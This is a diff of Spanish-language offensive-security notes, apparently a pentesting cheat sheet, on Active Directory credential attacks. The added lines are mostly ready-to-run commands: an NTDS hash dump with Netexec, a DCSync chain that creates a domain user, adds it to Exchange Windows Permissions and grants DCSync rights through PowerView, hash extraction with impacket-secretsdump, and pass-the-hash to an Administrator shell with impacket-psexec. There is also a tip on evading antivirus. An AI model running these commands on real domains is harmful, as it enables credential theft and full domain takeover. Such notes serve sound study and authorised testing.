@@ -40,12 +40,12 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 3. Replicating Directory Changes In Filtered Set 
 ```
 
-## Utilizando CrackMapExec
+## Utilizando Netexec
 
 ```powershell
 # Comando para usuarios con altos privilegios 
 
-❯ ./cme smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds   # Nos muestra loas hashes de los usuarios, por lo que se puede hacer 'Pass-The-Hash'
+❯ nxc smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds   # Nos muestra loas hashes de los usuarios, por lo que se puede hacer 'Pass-The-Hash'
 ```
 
 ## Utilizando Mimikatz
@@ -72,21 +72,40 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 	# upn 'UserPrincipalName' = Nombre del usuario y DC
 	# hashes = Hash del usuario 'NTLM'
 
-Nota: Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
+Notas: 
+	1. Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
 ```
 
 ## DCSync 
 
 ```powershell
-Si se tiene un usuario en el grupo 'Exchange Windows Permissions', se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+1. Si se esta en el grupo 'Account Operators' con 'GenericAll' sobre 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo
+2. Si se tiene un usuario en el grupo 'Exchange Windows Permissions' con 'WriteDacl', se puede ejecutar un DCSync sobre el dominio para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+
+❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators'
+❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
+
+❯ net group        # Mirar los grupos existentes 
+❯ net user omar    # Mirar la info del usuario 
+```
+
+```powershell
+3. Agregar el privilegio de DCSync al usuario  
 
 ❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+	# password = Contraseña del usuario 
 ❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
-❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity <user> -Rights DCSync 
+❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
+	# user = Usuario que se agrego en la variable $Cred
 
-Nota: El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
+Notas: 
+	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
+```
 
+```powershell
+4. Hacer DCSync desde Kali 
 
-# En Kali ejecutar el siguiente comando para hacer el DCSync
-❯ secretsdump.py domain1.local/user@IP-DC    # Ejecutar el DCSync con las credenciales del usuario creado en el DC
+❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
+
+❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
 ```
